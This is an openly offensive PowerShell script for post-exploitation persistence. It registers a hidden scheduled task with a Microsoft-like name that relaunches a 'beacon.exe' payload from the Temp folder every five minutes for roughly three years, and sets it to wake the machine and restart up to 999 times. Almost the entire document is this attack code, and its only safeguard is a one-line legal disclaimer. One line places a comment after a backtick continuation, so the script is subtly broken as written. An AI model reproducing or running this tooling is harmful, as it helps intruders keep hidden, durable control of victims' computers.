##POWERSHELL SCRIPT TO SET-UP PERSISTENCE ON A TARGET AFTER THE INITIAL HIT.
##DO NOT USE FOR ILLEGAL PURPOSES

echo "[+]Creating Task..."

#action
$taskAction = New-ScheduledTaskAction `
    -Execute 'C:\Windows\Temp\beacon.exe' #EDIT USING YOUR OWN SHELLCODE PATH ON TARGET

#triggering
$trigger = New-ScheduledTaskTrigger `
    -Daily `
    -At 11:00AM #INITIAL TASK EXECUTION TIME

$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RunOnlyIfNetworkAvailable `
    -WakeToRun `
    -RestartCount 999 ` #TIMES TO RESTART THE TASK IF IT FAILS 
    -RestartInterval (New-TimeSpan -Minutes 1) 

#creation
$task = Register-ScheduledTask `
    -Action $taskAction `
    -Trigger $trigger `
    -TaskName "MicrosoftExt\Powersistence" `
    -Description "Peristence Goes Brr..." `
    -Settings $settings

#repetition
$task.Triggers.Repetition.Duration = "P1075D" #TASK LIFESPAN
$task.Triggers.Repetition.Interval = "PT5M" #TASK REPEATING INTERVAL
$task | Set-ScheduledTask

echo "[+] Task Created!"
